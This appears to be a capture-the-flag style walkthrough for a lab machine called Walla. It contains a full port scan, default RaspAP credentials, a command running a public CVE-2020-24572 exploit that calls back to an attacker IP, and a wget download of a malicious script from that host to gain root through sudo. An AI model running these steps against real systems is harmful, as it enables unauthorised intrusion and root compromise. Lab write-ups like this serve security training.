---
icon: ubuntu
---

# Walla - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.97 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 16:16 EDT
Nmap scan report for 192.168.231.97
Host is up (0.030s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   29.33 ms 192.168.45.1
2   29.28 ms 192.168.45.254
3   24.18 ms 192.168.251.1
4   24.37 ms 192.168.231.97
```

### <mark style="color:$primary;">HTTP Port 8091 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2477).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2478).png" alt=""><figcaption></figcaption></figure>

Default creds worked <mark style="color:$success;">**admin:secret**</mark>

<figure><img src="../../.gitbook/assets/image (2479).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2480).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">RaspAP 2.5 RCE</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (2481).png" alt=""><figcaption></figcaption></figure>

```
git clone https://github.com/gerbsec/CVE-2020-24572-POC
```

```
python exploit.py 192.168.231.97 8091 192.168.45.158 8091 secret 1
```

<figure><img src="../../.gitbook/assets/image (2482).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2483).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2484).png" alt=""><figcaption></figcaption></figure>

I see an interesting python script in Walter's home directory. We only have read access to it, but we can run it as root. We cannot modify the script but we can try deleting it and replacing it with our own malicious script to get root access.

Let's create a malicious python script

<figure><img src="../../.gitbook/assets/image (2485).png" alt=""><figcaption></figcaption></figure>

Save it as script under the name wifi\_reset.py

```
wget 192.168.45.158/wifi_reset.py
```

<figure><img src="../../.gitbook/assets/image (2487).png" alt=""><figcaption></figcaption></figure>

I'll remove the original script and replace it with my own

<figure><img src="../../.gitbook/assets/image (2488).png" alt=""><figcaption></figcaption></figure>

Now to execute and escalate our privileges to root

```
sudo /usr/bin/python /home/walter/wifi_reset.py
```

<figure><img src="../../.gitbook/assets/image (2489).png" alt=""><figcaption></figcaption></figure>

